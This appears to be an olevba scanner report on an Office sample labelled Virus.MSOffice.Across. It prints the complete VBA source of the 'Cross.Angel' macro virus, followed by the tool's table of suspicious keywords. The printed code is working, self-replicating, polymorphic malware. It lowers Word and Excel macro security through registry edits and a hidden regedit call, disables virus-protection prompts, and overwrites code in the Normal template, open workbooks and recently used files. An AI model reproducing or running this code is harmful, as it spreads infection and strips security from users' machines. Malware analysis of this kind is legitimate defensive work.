olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Across-128f5e1f0ef5fd00d258976a5d5deca1bfa34557
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Across-128f5e1f0ef5fd00d258976a5d5deca1bfa34557 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: Virus.MSOffice.Across-128f5e1f0ef5fd00d258976a5d5deca1bfa34557 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio2.cls 
in file: Virus.MSOffice.Across-128f5e1f0ef5fd00d258976a5d5deca1bfa34557 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio3.cls 
in file: Virus.MSOffice.Across-128f5e1f0ef5fd00d258976a5d5deca1bfa34557 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Across-128f5e1f0ef5fd00d258976a5d5deca1bfa34557 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Cross.Angel
Private Sub Document_Close()
On Error Resume Next
Const ˆ»¾™Š = "' Cross.Angel", •Ç¤ Ÿ = 132, µÈÇŠ¿ = "9.0", À©¸Ë¬ = "Macro", Ë¶ž½œ = "Tools", ¯¹­®§ = &H1, ¯¹­®§_ = &H0, ¯¶˜™² = 0, ¢Â¶¥• = 1, »…¨�Ž = 12, µ—Ê·¦ = "excel.application", ¼Æ±¬• = "DieseArbeitsmappe"
Application.EnableCancelKey = (Rnd * ¯¶˜™²)
If Application.Version = µÈÇŠ¿ Then
    Application.CommandBars(À©¸Ë¬).Controls((¢Â¶¥• + ¢Â¶¥• + ¢Â¶¥•)).Enabled = (Rnd * ¯¶˜™²)
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = ¯¹­®§
Else
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ¯¹­®§_
    Application.CommandBars(Ë¶ž½œ).Controls(»…¨�Ž).Enabled = (Rnd * ¯¶˜™²)
    Options.VirusProtection = (Rnd * ¯¶˜™²)
End If
Options.SaveNormalPrompt = (Rnd * ¯¶˜™²)
’¸„„„ = ‚–˜¤�(ThisDocument.VBProject.VBComponents(¢Â¶¥•).CodeModule.Lines(¢Â¶¥•, •Ç¤ Ÿ))
If MacroContainer = ActiveDocument Then Set µˆ˜ˆŸ = NormalTemplate Else Set µˆ˜ˆŸ = ActiveDocument
With µˆ˜ˆŸ.VBProject.VBComponents(¢Â¶¥•).CodeModule
    If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
        .DeleteLines ¢Â¶¥•, .CountOfLines
        .InsertLines ¢Â¶¥•, ’¸„„„
        If µˆ˜ˆŸ = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
    End If
End With
If System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ¢Â¶¥• Then
Set ´°ƒˆ� = GetObject(, µ—Ê·¦)
If ´°ƒˆ� = "" Then Set ´°ƒˆ� = CreateObject(µ—Ê·¦): ª±›¤Ã = ¢Â¶¥•
If ª±›¤Ã <> ¢Â¶¥• Then
    For Each †�„–À In ´°ƒˆ�.Workbooks
       With †�„–À.VBProject.VBComponents(¼Æ±¬•).CodeModule
            If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
                .DeleteLines ¢Â¶¥•, .CountOfLines
                .InsertLines ¢Â¶¥•, ’¸„„„
                If †�„–À.Path <> "" Then †�„–À.Save Else †�„–À.SaveAs †�„–À.FullName
            End If
        End With
    Next
Else
    For †�„–À = ¢Â¶¥• To ´°ƒˆ�.Application.RecentFiles.Maximum
        ´°ƒˆ�.Application.RecentFiles(†�„–À).Open
            With ´°ƒˆ�.Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(¼Æ±¬•).CodeModule
                If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
                    .DeleteLines ¢Â¶¥•, .CountOfLines
                    .InsertLines ¢Â¶¥•, ’¸„„„
                End If
            End With
        ´°ƒˆ�.Application.Workbooks(Application.RecentFiles(1).Name).Close ¢Â¶¥•
    Next
    ´°ƒˆ�.Quit
End If
System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ¢Â¶¥•
End If
If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
If System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ¢Â¶¥• Then System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ¢Â¶¥•
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Const ˆ»¾™Š = "' Cross.Angel", •Ç¤ Ÿ = 132, µÈÇŠ¿ = "9.0", À©¸Ë¬ = "Macro", Ë¶ž½œ = "Tools", ¯¶˜™² = 0, ¢Â¶¥• = 1, »…¨�Ž = 10, µ—Ê·¦ = "word.application", ¼Æ±¬• = "DieseArbeitsmappe"
Application.EnableCancelKey = (Rnd * ¯¶˜™²)
If UCase(Dir("c:\.reg")) <> ".REG" Then
Open "c:\.reg" For Output As #1
    Print #1, "REGEDIT4"
If Application.Version = µÈÇŠ¿ Then
    Application.CommandBars(À©¸Ë¬).Controls((¢Â¶¥• + ¢Â¶¥• + ¢Â¶¥•)).Enabled = (Rnd * ¯¶˜™²)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
    Print #1, """Level""=dword:00000001"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
    Print #1, """Level""=dword:00000001"
Else
    Application.CommandBars(Ë¶ž½œ).Controls(»…¨�Ž).Enabled = (Rnd * ¯¶˜™²)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
    Print #1, """Options6""=dword:00000000"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
    Print #1, """EnableMacroVirusProtection""=""0"""
End If
Close #1
End If
Shell "regedit /s c:\.reg", vbHide
’¸„„„ = ‚–˜¤�(ThisWorkbook.VBProject.VBComponents(¼Æ±¬•).CodeModule.Lines(¢Â¶¥•, •Ç¤ Ÿ))
For Each †�„–À In Application.Workbooks
    With †�„–À.VBProject.VBComponents(¼Æ±¬•).CodeModule
        If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
            .DeleteLines ¢Â¶¥•, .CountOfLines
            .InsertLines ¢Â¶¥•, ’¸„„„
            If †�„–À.Path <> "" Then †�„–À.Save Else †�„–À.SaveAs †�„–À.FullName
        End If
    End With
Next
If Application.Workbooks.Count = ¢Â¶¥• Then
    Application.WindowState = xlMinimized
    For †�„–À = ¢Â¶¥• To Application.RecentFiles.Maximum
        Application.RecentFiles(†�„–À).Open
            With Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(¼Æ±¬•).CodeModule
                If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
                    .DeleteLines ¢Â¶¥•, .CountOfLines
                    .InsertLines ¢Â¶¥•, ’¸„„„
                End If
            End With
        Application.Workbooks(Application.RecentFiles(1).Name).Close ¢Â¶¥•
    Next
End If
Set ´°ƒˆ� = GetObject(, µ—Ê·¦)
If ´°ƒˆ� = "" Then Set ´°ƒˆ� = CreateObject(µ—Ê·¦): ª±›¤Ã = ¢Â¶¥•
If ´°ƒˆ�.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ¢Â¶¥• Then ´°ƒˆ�.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ¢Â¶¥•
If ´°ƒˆ�.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ¢Â¶¥• Then
With ´°ƒˆ�.NormalTemplate.VBProject.VBComponents(¢Â¶¥•).CodeModule
    If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
        .DeleteLines ¢Â¶¥•, .CountOfLines
        .InsertLines ¢Â¶¥•, ’¸„„„
        ´°ƒˆ�.NormalTemplate.Save
        ´°ƒˆ�.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ¢Â¶¥•
    End If
End With
End If
If ª±›¤Ã = ¢Â¶¥• Then ´°ƒˆ�.Quit Else If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
End Sub
Private Function ‚–˜¤�(’¸„„„) 'JSMP v1.2
Dim ª•¦°Â(0 To 20): Randomize
Â¡ÁƒŒ = 1: ª•¦°Â(0) = "’¸„„„": ª•¦°Â(1) = "‚–˜¤�": ª•¦°Â(2) = "ª•¦°Â": ª•¦°Â(3) = "³žÃ­˜": ª•¦°Â(4) = "š²µ‚¤": ª•¦°Â(5) = "Â¡ÁƒŒ": ª•¦°Â(6) = "ˆ»¾™Š": ª•¦°Â(7) = "•Ç¤ Ÿ": ª•¦°Â(8) = "µÈÇŠ¿": ª•¦°Â(9) = "À©¸Ë¬": ª•¦°Â(10) = "Ë¶ž½œ": ª•¦°Â(11) = "¯¹­®§": ª•¦°Â(12) = "¯¶˜™²": ª•¦°Â(13) = "¢Â¶¥•": ª•¦°Â(14) = "»…¨�Ž": ª•¦°Â(15) = "µ—Ê·¦": ª•¦°Â(16) = "¼Æ±¬•": ª•¦°Â(17) = "µˆ˜ˆŸ": ª•¦°Â(18) = "´°ƒˆ�": ª•¦°Â(19) = "ª±›¤Ã": ª•¦°Â(20) = "†�„–À"
For ³žÃ­˜ = 0 To 20
š²µ‚¤ = Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74))
Do
Â¡ÁƒŒ = InStr(Â¡ÁƒŒ + 1, ’¸„„„, ª•¦°Â(³žÃ­˜))
If Â¡ÁƒŒ Then ’¸„„„ = Mid(’¸„„„, 1, (Â¡ÁƒŒ - 1)) & š²µ‚¤ & Mid(’¸„„„, (Â¡ÁƒŒ + Len(ª•¦°Â(³žÃ­˜))), Len(’¸„„„))
Loop While Â¡ÁƒŒ
Next
‚–˜¤� = ’¸„„„
End Function
'Cross.Angel written by jackie twoflower /Lz0NT /MVT
'Uses Jackie's Stupid Macro Poly v1.2
'Office97 and Office2000 compatible | New Cross area!
'Hey my angel, this is for you. Why you left me?
'I can't live without you! I luv ya!
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
